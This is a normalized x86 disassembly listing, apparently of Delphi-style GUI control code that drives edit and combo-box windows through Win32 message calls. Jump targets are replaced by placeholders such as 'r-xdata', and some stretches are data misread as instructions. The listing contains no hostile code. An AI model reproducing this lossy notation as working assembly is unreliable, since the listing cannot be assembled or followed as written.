mov [ eax + 0x26c ] edx
push 0x0
push 0x0
push 0xb04d
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
call PostMessageA
jmp r-xdata
sub_3a96c2c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_3ab7c38
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3a96c6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab7220
pop esi
pop ebx
retn
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
mov eax ebx
call sub_3a968f0
mov eax ebx
call sub_3ab4518
sub_3a96ca0
push ebx
mov ebx eax
mov eax ebx
call sub_3ab7164
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_3a9692c
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_3a96ce8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x258 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab6fbc
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_3ab7c38
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_3a96550
sub_3a96d24
push esi
mov esi eax
mov eax esi
call sub_3ab905c
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
mov eax esi
mov si 0xffb0
call sub_3a6457c
push 0xfffffff0
mov eax esi
call sub_3ab7c38
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_3a96d5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
mov edx esi
mov eax ebx
call sub_3ab8ec4
pop esi
pop ebx
retn
sub_3a96d78
push ebx
push esi
mov ebx eax
xor esi esi
mov eax [ ebx + 0x18 ]
call sub_3ab7fd8
test al al
jne r-xdata
push 0x0
push 0x0
push 0xba
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov esi eax
push 0x0
push 0x0
mov eax esi
dec eax
push eax
push 0xbb
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
push eax
push 0xc1
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
dec esi
sub_3a96de8
push ebx
push esi
push edi
add esp 0xfffff004
push eax
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov [ eax ] 0x1000
mov eax esp
push eax
push esi
push 0xc4
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov ecx eax
mov edx esp
mov eax edi
call sub_3a65390
add esp 0x1000
pop edi
pop esi
pop ebx
retn
sub_3a96e2c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
add eax esi
push eax
push esi
push 0xb1
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
mov eax edi
call sub_3a65730
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
sub_3a96ea0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_3a96f8b
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a96f92
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
push 0x0
push edi
push 0xbb
mov eax [ esi + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
push 0x0
dec edi
push edi
push 0xbb
mov eax [ esi + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_3a655b8
jmp r-xdata
push 0x0
push ebx
push 0xc1
mov eax [ esi + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
test eax eax
je r-xdata
push ebx
push ebx
push 0xb1
mov eax [ esi + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_3a65730
push eax
push 0x0
push 0xc2
mov eax [ esi + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
add ebx eax
lea eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_3a655b8
sub_3a96f9f
inc [ edx ]
add [ eax ] al
add [ 0xa ] cl
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi edx
mov ebx eax
push 0x0
push edi
push 0xbb
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
inc edi
push edi
push 0xbb
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
mov edi eax
test edi edi
jge r-xdata
push edi
push esi
push 0xb1
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
mov edi eax
add edi esi
sub_3a9704c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x18 ]
call sub_3ab7fd8
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
xor bl 0x1
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ esi + 0x18 ]
call sub_3ab0e78
mov eax [ esi + 0x18 ]
call sub_3ab0188
sub_3a970b0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3a97184
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_3a695dc
mov edi [ ebp - 0x4 ]
mov ebx edi
test ebx ebx
je r-xdata
mov eax [ esi + 0x18 ]
call sub_3aafaf8
cmp ebx eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea edx [ ebp - 0x8 ]
mov eax [ esi + 0x18 ]
call sub_3aafb88
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3a656c8
setne al
mov al 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9718b
lea eax [ ebp - 0xc ]
call sub_3a652a0
lea eax [ ebp - 0x8 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
push edi
push 0x0
push 0xc
mov eax [ esi + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
test eax eax
jne r-xdata
test al al
je r-xdata
push 0x0
mov eax [ esi + 0x18 ]
xor ecx ecx
mov edx 0xb012
call sub_3ab0e78
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
sub_3a97194
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3a961a8
mov edx 0xb9
mov eax ebx
call sub_3aaf278
mov edx 0x59
mov eax ebx
call sub_3aaf2ac
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov [ ebx + 0x276 ] 0x1
mov [ ebx + 0x277 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov esi eax
mov [ ebx + 0x270 ] esi
mov [ esi + 0x18 ] ebx
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3a97224
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x270 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ab2b34
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a97254
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_3a966a4
mov eax ebx
mov si 0xffc7
call sub_3a6457c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x274 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
movzx ecx [ ebx + 0x276 ]
mov ecx [ ecx * 4 + rw-data ]
not ecx
and edx ecx
or edx 0x4
or eax edx
movzx edx [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_3a972b8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_3a67f50
mov [ esi + 0x1b4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5 ] 0x8
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfffff7ff
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_3a67f50
mov edi eax
mov [ esi + 0x1b4 ] edi
test edi edi
je r-xdata
mov eax [ ebx ]
push eax
push 0x0
push 0xc
mov eax [ esi + 0x1b4 ]
push eax
call __imp_SendMessageA
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push edi
call SendMessageA
jmp r-xdata
sub_3a97381
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
push 0x0
push 0x0
push 0xb0
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
shr eax 0x10
movzx eax ax
mov [ esi ] eax
push 0x0
mov eax [ esi ]
push eax
push 0xc9
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
mov [ esi + 0x4 ] eax
push 0x0
push 0xffffffff
push 0xbb
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
sub [ esi ] eax
pop esi
pop ebx
retn
sub_3a973e4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov eax [ esi + 0x4 ]
push eax
push 0xbb
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
add eax [ esi ]
mov esi eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_3ab7c38
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_3a9748c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x278 ] 0x0
je r-xdata
and [ esi + 0xc ] 0xfffffffd
or [ esi + 0xc ] 0x2
jmp r-xdata
pop esi
pop ebx
retn
and [ esi + 0xc ] 0xfffffffb
cmp [ ebx + 0x277 ] 0x0
jne r-xdata
sub_3a974c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab6bb4
cmp [ esi ] 0xd
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x277 ] 0x0
jne r-xdata
mov [ esi ] 0x0
sub_3a97508
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3a97588
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push esi
push 0x150
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov edi eax
cmp edi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a9758f
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_3a67194
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_3a7b910
test esi esi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jle r-xdata
sub_3a97598
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop edi
pop esi
pop ebx
retn
sub_3a975bc
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_3a659c0
test eax eax
jle r-xdata
mov edx esi
xchg edx eax
call sub_3a659c0
mov eax [ esi ]
call sub_3a65730
push eax
push edi
push 0x148
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_3a97618
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_3a9767c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_3aafb88
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_3aafbb8
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a97683
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a97688
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x144
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop esi
pop ebx
retn
sub_3a976a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_3a65730
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop esi
pop ebx
retn
sub_3a976d0
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x18 ]
call sub_3ab7c38
push eax
call __imp_SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
call sub_3ab0188
sub_3a97704
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3ab29f0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_3aaf278
mov edx 0x19
mov eax ebx
call sub_3aaf2ac
mov dl 0x1
mov eax ebx
call sub_3ab7f08
xor edx edx
mov eax ebx
call sub_3aafd7c
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a89cb0
mov esi eax
mov [ ebx + 0x250 ] esi
mov eax esi
mov edx ebx
call sub_3aae42c
mov [ ebx + 0x280 ] 0x10
push ebx
mov eax [ ebx ]
mov eax [ eax + 0x108 ]
push eax
call sub_3a84724
mov [ ebx + 0x294 ] eax
push ebx
push sub_3a97d14
call sub_3a84724
mov [ ebx + 0x29c ] eax
mov [ ebx + 0x258 ] 0x8
mov [ ebx + 0x25c ] 0xffffffff
mov [ ebx + 0x2a8 ] 0xffffffff
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_3a977fc
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ esi + 0x29c ]
call sub_3a847bc
mov eax [ esi + 0x294 ]
call sub_3a847bc
mov eax [ esi + 0x250 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ab2b34
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xb4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3a9787e
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
call sub_3ab42a8
xor eax eax
mov [ ebx + 0x288 ] eax
xor eax eax
mov [ ebx + 0x28c ] eax
xor eax eax
mov [ ebx + 0x290 ] eax
pop ebx
retn
sub_3a978c8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x157
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_3a978ec
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
push 0x0
movzx eax bl
push eax
push 0x14f
mov eax esi
call sub_3ab7c38
push eax
call __imp_SendMessageA
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax esi
call sub_3ab7c38
push eax
call InvalidateRect
add esp 0x10
pop esi
pop ebx
retn
sub_3a97930
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
push 0x0
push 0x0
push 0x147
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
pop ebx
retn
mov eax [ ebx + 0x25c ]
pop ebx
retn
sub_3a9795c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
cmp esi eax
je r-xdata
mov [ ebx + 0x25c ] esi
pop esi
pop ebx
retn
pop esi
pop ebx
retn
push 0x0
push esi
push 0x14e
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3a97998
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jge r-xdata
cmp esi [ ebx + 0x254 ]
je r-xdata
xor esi esi
pop esi
pop ebx
retn
mov [ ebx + 0x254 ] esi
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
push 0x0
push esi
push 0x141
mov eax ebx
call sub_3ab7c38
push eax
call __imp_SendMessageA
sub_3a979e8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x64 ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0x64 ]
push eax
mov eax esi
call sub_3ab7c38
push eax
call SetWindowTextA
sub_3a97a24
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_3a978c8
test al al
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0xc ] 0x4
sub_3a97a5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_3ab7220
pop esi
pop ebx
retn
mov eax ebx
call sub_3ab4518
sub_3a97a80
push ebp
mov ebp esp
add esp 0xffffffe8
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x0
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx 0x2
call sub_3a90f50
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a97af8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x4
mov eax [ ebp - 0x4 ]
push eax
push 0x318
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x288 ]
push eax
call __imp_SendMessageA
lea edx [ ebp - 0x18 ]
mov cl 0xff
mov eax [ ebp - 0x8 ]
call sub_3a91048
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a97aff
or edx 0xffffffff
mov eax [ ebp - 0x8 ]
call sub_3a90fdc
retn
sub_3a97b08
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx ] 0x112
jne r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x288 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x104 ]
mov eax [ ebx ]
mov edx eax
cmp edx 0x201
jg r-xdata
cmp eax 0x109
ja r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub edx 0x203
je r-xdata
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac463c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5d ] 0x1
jne r-xdata
sub edx 0xae4a
je r-xdata
sub edx 0x30
je r-xdata
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov esi [ eax ]
call [ esi + 0x100 ]
test al al
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_3aaf6c0
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0xc ] eax
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
movzx eax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x202
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
push eax
call __imp_SendMessageA
or ecx 0xffffffff
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_3ab02fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a8 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
sub edx 0x1d0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_3a97d06
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
push eax
push 0x0
call MapWindowPoints
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
call sub_3a97a80
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2a8 ] 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
push eax
call ReleaseDC
retn
push 0x0
push 0x3
push 0xd3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
push eax
call SendMessageA
jmp r-xdata
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3ab0e78
jmp r-xdata
jmp r-xdata
sub_3a97d34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3a97fed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x104
jg r-xdata
cmp eax 0xbd00
jg r-xdata
je r-xdata
sub eax 0xbd02
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x28c ]
je r-xdata
cmp eax 0x87
jg r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
sub eax 0x105
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
mov eax [ ebp + 0x8 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
cmp [ ebx ] 0x203
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab69e0
test al al
je r-xdata
sub eax 0x100
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab6b0c
test al al
je r-xdata
sub eax 0xfb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x80
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a978c8
test al al
je r-xdata
sub eax 0x7
je r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_3ad020c
jmp r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_3a6457c
dec eax
je r-xdata
mov [ ebx + 0xc ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_3ac463c
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a95590
test al al
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab6bd4
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xf8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
je r-xdata
sub eax 0x7c
je r-xdata
movsx eax [ ebx + 0x8 ]
mov [ ebp - 0xc ] eax
movsx eax [ ebx + 0xa ]
mov [ ebp - 0x8 ] eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_3ab7c38
push eax
push esi
call MapWindowPoints
movzx eax [ ebp - 0xc ]
mov [ ebx + 0x8 ] ax
movzx eax [ ebp - 0x8 ]
mov [ ebx + 0xa ] ax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
